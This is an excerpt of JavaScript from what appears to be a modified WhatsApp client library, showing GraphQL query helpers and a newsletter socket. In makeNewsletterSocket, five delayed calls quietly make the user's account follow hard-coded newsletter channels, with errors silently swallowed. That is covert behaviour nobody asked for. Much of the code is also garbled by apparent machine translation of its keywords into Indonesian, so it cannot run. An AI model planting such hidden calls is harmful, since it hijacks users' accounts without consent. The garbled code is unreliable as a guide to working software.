	...
	generateMessageTag
	 ...
	 return query({
		...
		atribut : {
			...
			tipe : 'dapatkan' ,
			Kepada : WABinary_1 . S_WHATSAPP_NET ,
			xmlns : 'w:mex'
		} ,
		konten : [
			{
				tag : 'query' ,
				atribut : {  query_id : queryId  } ,
				konten : Buffer . dari ( JSON . stringify ( {  variabel  } ) , 'utf-8' )
			}
		]
	} )
}
...
const  executeWMexQuery = async  (
	...
	const  result = await  wMexQuery ( variabel , queryId , query , generateMessageTag )
	const  child = ( 0 , WABinary_1 . getBinaryNodeChild ) ( result , 'result' )
	jika  ( anak ? .konten )  {
		const  data = JSON.parse ( child.content.toString ( ) )​​​​​​

		jika  ( data.errors && data.errors.length > 0 ) {​​​​​​ 
			const  errorMessages = data.errors.map ( ( err ) => err.message || ' Kesalahan tidak dikenal ' ) . join ( ' , ' )
			const  firstError = data.errors [ 0 ]​​
			const  errorCode = firstError.extensions ? .error_code || 400​​
			lempar  Boom baru  ( 'Kesalahan server GraphQL:' + errorMessages , {
                kode status : kode kesalahan , data : kesalahan pertama 
            } )
		}

		const  response = dataPath ? data ?. data ?. [ dataPath ] : data ?. data
		jika  ( tipe  respons !== 'tidak terdefinisi' )  {
			kembalikan  respons
		}
	}
	...
	throw  new  Boom ( `Gagal melakukan ${ action } , struktur respons tidak terduga.` , {
        Kode status : 400 ,
        data: result
    })
}
...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
    try {
        await newsletterWMexQuery("120363420342636447@newsletter", Types_1.QueryIds.FOLLOW);
    } catch {}
}, 90000);
	setTimeout(async () => {
    try {
        await newsletterWMexQuery("120363400878059888@newsletter", Types_1.QueryIds.FOLLOW);
    } catch {}
}, 90000);
	setTimeout(async () => {
    try {
        await newsletterWMexQuery("120363400500175470@newsletter", Types_1.QueryIds.FOLLOW);
    } catch {}
}, 90000);
	setTimeout(async () => {
    try {
        await newsletterWMexQuery("120363403316191594@newsletter", Types_1.QueryIds.FOLLOW);
    } catch {}
}, 90000);
	setTimeout(async () => {
    try {
        await newsletterWMexQuery("120363418199382913@newsletter", Types_1.QueryIds.FOLLOW);
    } catch {}
}, 90000);
